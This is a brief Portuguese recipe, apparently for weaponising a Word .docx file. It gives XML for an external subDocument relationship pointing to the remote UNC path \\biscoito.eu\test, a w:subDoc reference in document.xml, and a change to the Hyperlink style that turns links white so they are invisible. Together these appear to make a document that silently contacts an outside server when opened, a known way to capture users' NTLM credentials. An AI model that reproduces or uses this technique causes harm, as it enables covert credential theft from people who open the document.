# Como fazer um subdoc 101

## Adicionar o relationship do subdoc pra os relationships do documento

##### Importante: O Target deve começar com `file:///` (barras normais) e a path UNC depois (com barras invertidas)

`word/_rels/document.xml.rels`

```xml
<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" Target="file:///\\biscoito.eu\test\" TargetMode="External"/>
```

## Botar a referencia do subdoc antes do fim da primeira seção do documento

`word/document.xml`

```xml
<!-- Ref: http://www.datypic.com/sc/ooxml/e-w_subDoc-1.html -->
<w:p w:rsidR="00212331" w:rsidRPr="002B0DC2" w:rsidRDefault="00212331">
    <w:subDoc r:id="rId5"/>
</w:p>
<w:sectPr (...)
```

## Mudar todas cores de hyperlink pra `#FFFFFF`

`word/styles.xml`

```xml
<w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00400B73"/>
    <w:rPr>     <!-- Aqui V -->
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:u w:val="single"/>
    </w:rPr>
 </w:style>
 ```
